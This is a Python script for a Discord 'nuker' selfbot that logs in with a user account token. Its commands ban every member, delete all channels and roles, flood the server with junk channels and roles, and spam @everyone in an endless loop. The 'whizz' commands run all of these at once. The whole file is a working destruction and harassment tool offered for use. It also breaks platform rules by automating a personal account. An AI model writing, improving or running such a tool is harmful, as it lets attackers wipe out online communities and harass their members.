import discord
from discord.ext import commands
from colorama import Fore
import shutil
import asyncio
import os
import time

if os.name != "nt":
    print(Fore.YELLOW + "[" + Fore.RESET + Fore.BLUE + "*" + Fore.RESET + Fore.YELLOW + "]" + Fore.RESET + Fore.RED + "You are not on Windows")
    time.sleep(30)
    exit()

try:
    def CLEAR():
        os.system("cls")

    print(Fore.BLACK + '' + Fore.RESET)
    CLEAR()

    width = shutil.get_terminal_size().columns

    token = input(Fore.YELLOW + "[" + Fore.RESET + Fore.MAGENTA + "*" + Fore.RESET + Fore.YELLOW + "]" + Fore.RESET + "Token: ")
    prefix = input(Fore.YELLOW + "[" + Fore.RESET + Fore.MAGENTA + "*" + Fore.RESET + Fore.YELLOW + "]" + Fore.RESET + "Prefix: ")

    commands_for_bot = [f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}ban_all{Fore.RESET}       ┃ {Fore.LIGHTBLACK_EX}Bans Everyone{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}unban_all{Fore.RESET}     ┃ {Fore.LIGHTBLACK_EX}Unbans Everyone{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}ntc <name>{Fore.RESET}    ┃ {Fore.LIGHTBLACK_EX}Nukes Text Channels{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}nvc <name>{Fore.RESET}    ┃ {Fore.LIGHTBLACK_EX}Nukes Voice Channels{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}nc <name>{Fore.RESET}     ┃ {Fore.LIGHTBLACK_EX}Nukes Channels{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}rln <name>{Fore.RESET}    ┃ {Fore.LIGHTBLACK_EX}Roles Nukes{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}ma <name>{Fore.RESET}     ┃ {Fore.LIGHTBLACK_EX}Mentions @everyone Forever{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}whizz <name>{Fore.RESET}  ┃ {Fore.LIGHTBLACK_EX}Does all of the Above (Except {prefix}unban_all and {prefix}ma <name>){Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}whizzs <name>{Fore.RESET} ┃ {Fore.LIGHTBLACK_EX}Does all of the Above (Except {prefix}unban_all). But slower{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}clear{Fore.RESET}         ┃ {Fore.LIGHTBLACK_EX}Clears Your Console{Fore.RESET}",
                        f"{Fore.RED}>{Fore.RESET}{prefix}{Fore.YELLOW}help{Fore.RESET}          ┃ {Fore.LIGHTBLACK_EX}Shows you Nukes Commands{Fore.RESET}"]

    intents = discord.Intents.default()
    intents.members = True

    client = commands.Bot(command_prefix=prefix, help_command=None, case_insensitive=True, intents=intents, self_bot=True)

    @client.event
    async def on_ready():
        CLEAR()
        print(f"{Fore.RED}>{Fore.RESET}{Fore.YELLOW}Authentakating your token...{Fore.RESET} {Fore.LIGHTBLACK_EX}{token}{Fore.RESET}")
        print(f"{Fore.RED}>{Fore.RESET}{Fore.YELLOW}Connecting to your account...{Fore.RESET} {Fore.LIGHTBLACK_EX}{client.user}{Fore.RESET}")
        await asyncio.sleep(3)
        print(f"{Fore.GREEN}Connected!{Fore.RESET}".center(width))
        await asyncio.sleep(1)
        CLEAR()
        print(Fore.CYAN + "╔═╗╔╗ ╔═╗╔╦╗ ╦╦ ╦╦  ╔═╗".center(width) + Fore.RESET)
        print(Fore.CYAN + "╠═╣╠╩╗╠═╣ ║║ ║║ ║║  ╠═╣".center(width) + Fore.RESET)
        print(Fore.CYAN + "╩ ╩╚═╝╩ ╩═╩╝╚╝╚═╝╩═╝╩ ╩".center(width) + Fore.RESET)
        print(commands_for_bot[0])
        print(commands_for_bot[1])
        print(commands_for_bot[2])
        print(commands_for_bot[3])
        print(commands_for_bot[4])
        print(commands_for_bot[5])
        print(commands_for_bot[6])
        print(commands_for_bot[7])
        print(commands_for_bot[8])
        print(commands_for_bot[9])
        print(commands_for_bot[10])

    def style():
        print(Fore.CYAN + "╔═╗╔╗ ╔═╗╔╦╗ ╦╦ ╦╦  ╔═╗".center(width) + Fore.RESET)
        print(Fore.CYAN + "╠═╣╠╩╗╠═╣ ║║ ║║ ║║  ╠═╣".center(width) + Fore.RESET)
        print(Fore.CYAN + "╩ ╩╚═╝╩ ╩═╩╝╚╝╚═╝╩═╝╩ ╩".center(width) + Fore.RESET)
        print(commands_for_bot[0])
        print(commands_for_bot[1])
        print(commands_for_bot[2])
        print(commands_for_bot[3])
        print(commands_for_bot[4])
        print(commands_for_bot[5])
        print(commands_for_bot[6])
        print(commands_for_bot[7])
        print(commands_for_bot[8])
        print(commands_for_bot[9])
        print(commands_for_bot[10])

    @client.command()
    async def help(ctx):
        await ctx.message.delete()
        style()

    @client.command()
    @commands.has_permissions(ban_members=True, manage_channels=True, manage_roles=True, mention_everyone=True)
    async def whizz(ctx, *, name):
        await ctx.message.delete()
        guild = ctx.guild
        amount_of_channels = len(guild.channels)
        amount_of_roles = len(guild.roles)
        for member in guild.members:
            try:
                await member.ban()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Banned {}'.format(member))
            except:
                print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Cannot ban {} because they are admin".format(member))
        for channel in guild.channels:
            try:
                await channel.delete()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted channel named {}'.format(channel))
            except:
                print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Cannot delete {} because it's private".format(channel))
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all channels')
        for role in guild.roles:
            try:
                await role.delete()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted role named {}'.format(role))
            except:
                print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Cannot delete {} role because it has the same permissions as me or higher".format(role))
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all roles')
        while amount_of_channels < 497 - amount_of_channels and amount_of_roles < 250 - amount_of_roles:
            await guild.create_text_channel(name)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new text channel named {}'.format(name))
            await guild.create_voice_channel(name)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new voice channel named {}'.format(name))
            await guild.create_role(name=name, color=0xFFFFFF)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new role named {}'.format(name))
        print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.MAGENTA + "Destruction has been made your discord whizz for {} has been done".format(guild.name))


    @whizz.error
    async def whizz_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Does not have admin to ban members or create channels or create roles or mention everyone".format(ctx.author))
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the name for new channels or new roles or new mention for everyone".format(ctx.author))

    @client.command()
    @commands.has_permissions(ban_members=True, manage_channels=True, manage_roles=True, mention_everyone=True)
    async def whizzs(ctx, *, name):
        await ctx.message.delete()
        guild = ctx.guild
        amount_of_channels = len(guild.channels)
        amount_of_roles = len(guild.roles)
        for member in guild.members:
            try:
                await member.ban()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Banned {}'.format(member))
            except:
                print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Cannot ban {} because they are admin".format(member))
        for channel in guild.channels:
            try:
                await channel.delete()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted channel named {}'.format(channel))
            except:
                print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Cannot delete {} because it's private".format(channel))
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all channels')
        for role in guild.roles:
            try:
                await role.delete()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted role named {}'.format(role))
            except:
                print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Cannot delete {} role because it has the same permissions as me or higher".format(role))
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all roles')
        while amount_of_channels < 497 - amount_of_channels and amount_of_roles < 250 - amount_of_roles:
            await guild.create_text_channel(name)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new text channel named {}'.format(name))
            for channel in guild.text_channels:
                await channel.send("@everyone @here {}".format(name))
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Mentioned everyone in {} telling them {}'.format(channel, name))
            await guild.create_voice_channel(name)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new voice channel named {}'.format(name))
            await guild.create_role(name=name, color=0xFFFFFF)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new role named {}'.format(name))
        print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.MAGENTA + "Destruction has been made your discord whizz for {} has been done".format(guild.name))

    @whizzs.error
    async def whizzs_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Does not have admin to ban members or create channels or create roles or mention everyone".format(ctx.author))
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the name for new channels or new roles or new mention for everyone".format(ctx.author))

    @client.command()
    @commands.has_permissions(ban_members=True)
    async def ban_all(ctx):
        await ctx.message.delete()
        guild = ctx.guild
        for member in guild.members:
            try:
                await member.ban()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Banned {}'.format(member))
            except:
                print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Cannot ban {} because they are admin".format(member))

    @ban_all.error
    async def ban_all_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Does not have admin to ban members".format(ctx.author))

    @client.command()  # Unban all members
    @commands.has_permissions(ban_members=True)
    async def unban_all(ctx):
        await ctx.message.delete()
        banned_users = await ctx.guild.bans()
        for ban_entry in banned_users:
            user = ban_entry.user
            await ctx.guild.unban(user)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Unbanned {}'.format(user))
        print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "There is no one to unban")

    @unban_all.error
    async def unban_all_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Has no permissions to unban members".format(ctx.author))

    @client.command()  # Spam text channels
    @commands.has_permissions(manage_channels=True)
    async def ntc(ctx, *, name):
        await ctx.message.delete()
        guild = ctx.guild
        amount_of_text_channels = len(guild.channels)
        for channel in guild.channels:
            await channel.delete()
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted channel named {}'.format(name))
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all channels')
        if amount_of_text_channels == amount_of_text_channels:
            while amount_of_text_channels < 497 - amount_of_text_channels:
                await guild.create_text_channel(name)
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new text channel named {}'.format(name))
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Max numbers of text channels reached")

    @ntc.error  # Text error
    async def spam_text_channel_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Has no permissions to create new text channels".format(ctx.author))
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the name for new text channels".format(ctx.author))

    @client.command()  # Spam voice channels
    @commands.has_permissions(manage_channels=True)
    async def nvc(ctx, *, name):
        await ctx.message.delete()
        guild = ctx.guild
        amount_of_voice_channels = len(guild.channels)
        for channel in guild.channels:
            await channel.delete()
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted channel named {}'.format(name))
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all channels')
        print(amount_of_voice_channels)
        if amount_of_voice_channels == amount_of_voice_channels:
            while amount_of_voice_channels < 497 - amount_of_voice_channels:
                await guild.create_voice_channel(name)
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new voice channel named {}'.format(name))
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Max numbers of voice channels reached")

    @nvc.error  # Spam voice channels error
    async def nvc_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Has no permissions to create new voice channels".format(ctx.author))
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the name for new voice channels".format(ctx.author))

    @client.command() # Spam channels
    @commands.has_permissions(manage_channels=True)
    async def nc(ctx, *, name):
        await ctx.message.delete()
        guild = ctx.guild
        amount_of_channels = len(guild.channels)
        for channel in guild.channels:
            await channel.delete()
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted channel named {}'.format(channel))
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all channels')
        while amount_of_channels < 497 - amount_of_channels:
            await guild.create_text_channel(name)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new text channel named {}'.format(name))
            await guild.create_voice_channel(name)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new voice channel named {}'.format(name))
        print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Max numbers of channels reached or destruction ended")


    @nc.error # Spam channels error
    async def nc_erorr(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Has no permissions to create new channels".format(ctx.author))
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the name for new channels".format(ctx.author))


    @client.command()  # Spam role
    @commands.has_permissions(manage_roles=True)
    async def rln(ctx, *, name):
        await ctx.message.delete()
        guild = ctx.guild
        amount_of_roles = len(guild.roles)
        for role in guild.roles:
            try:
                await role.delete()
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted role named {}'.format(role))
            except:
                pass
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Deleted all roles')
        while amount_of_roles < 250 - amount_of_roles:
            await guild.create_role(name=name, color=0xFFFFFF)
            print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Created a new role named {}'.format(name))
        print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "Max numbers of roles reached or destruction has ended")


    @rln.error # Spam role error
    async def rln_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the permissions to create new roles".format(ctx.author))
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the name to create new roles".format(ctx.author))

    @client.command() # Spam @everyone
    @commands.has_permissions(mention_everyone=True)
    async def ma(ctx, *, name):
        await ctx.message.delete()
        guild = ctx.guild
        while True:
            for channel in guild.text_channels:
                await channel.send("@everyone @here {}".format(name))
                print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Mentioned everyone in {} telling them {}'.format(channel, name))

    @ma.error # Spam @everyone error
    async def ma_error(ctx, error):
        if isinstance(error, commands.MissingPermissions):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Doesnt have admin to say @everyone".format(ctx.author))
        elif isinstance(error, commands.MissingRequiredArgument):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{} Is missing the name for the \\@everyone mention role".format(ctx.author))

    @client.command()
    async def clear(ctx):
        await ctx.message.delete()
        CLEAR()
        print(Fore.YELLOW + '[' + Fore.RESET + Fore.BLUE + '*' + Fore.RESET + Fore.YELLOW + ']' + Fore.RESET + Fore.MAGENTA + 'Cleared the terminal')
        style()

    @client.event
    async def on_command_error(ctx, error):
        if isinstance(error, commands.CommandNotFound):
            await ctx.message.delete()
            print(Fore.RESET + "[" + Fore.BLUE + "*" + Fore.RESET + "]" + Fore.RED + "{}".format(error))

    client.run(token, bot=False)

except OSError:
    print(Fore.YELLOW + "[" + Fore.RESET + Fore.BLUE + "*" + Fore.RESET + Fore.YELLOW + "]" + Fore.RESET + Fore.RED + "Connection error")
    time.sleep(30)
except:
    print(Fore.YELLOW + "[" + Fore.RESET + Fore.BLUE + "*" + Fore.RESET + Fore.YELLOW + "]" + Fore.RESET + Fore.RED + "Invalid token")
    time.sleep(30)
